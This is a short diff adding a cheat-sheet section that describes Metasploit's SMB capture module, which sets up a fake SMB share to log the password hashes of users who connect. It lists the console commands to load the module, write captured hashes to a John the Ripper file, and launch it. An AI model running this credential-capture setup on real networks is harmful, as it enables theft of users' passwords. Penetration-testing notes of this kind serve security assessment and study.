@@ -1,0 +1,10 @@
+== SMB Capture ==
+
+Creates a fake SMB share and logs all the password shares of users attempting to connect 
+to it.
+
+	msf> use auxilary/server/capture/smb
+	msf..> set JOHNPWFILE "/home/u/john.txt"
+	msf..> exploit
+
+
